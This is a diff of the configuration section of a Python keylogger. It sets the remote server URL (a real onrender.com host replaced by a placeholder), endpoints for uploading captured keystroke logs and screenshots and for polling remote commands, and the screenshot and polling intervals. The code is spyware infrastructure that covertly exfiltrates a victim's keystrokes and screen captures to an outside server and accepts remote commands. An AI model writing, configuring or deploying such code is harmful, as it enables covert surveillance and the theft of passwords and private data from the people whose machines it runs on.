@@ -14,7 +14,7 @@ from PIL import ImageGrab
 # ─────────────────────────────────────────────
 #  CONFIGURATION — update BASE_URL before use
 # ─────────────────────────────────────────────
-BASE_URL       = "https://keylogger-hwdc.onrender.com"  # ← Replace with your Render URL
+BASE_URL       = "https://your-app.onrender.com"  # ← Replace with your Render URL
 SERVER_URL     = f"{BASE_URL}/log"
 SCREENSHOT_URL = f"{BASE_URL}/screenshot"
 COMMAND_URL    = f"{BASE_URL}/command"
@@ -22,7 +22,7 @@ COMMAND_URL    = f"{BASE_URL}/command"
 LOG_DIR  = "keylogger_logs"
 LOG_FILE = os.path.join(LOG_DIR, "keylogger.log")
 
-SCREENSHOT_INTERVAL = 2  # seconds between screenshots
+SCREENSHOT_INTERVAL = 30  # seconds between screenshots
 POLL_INTERVAL       = 5   # seconds between command polls
 
 # ─────────────────────────────────────────────
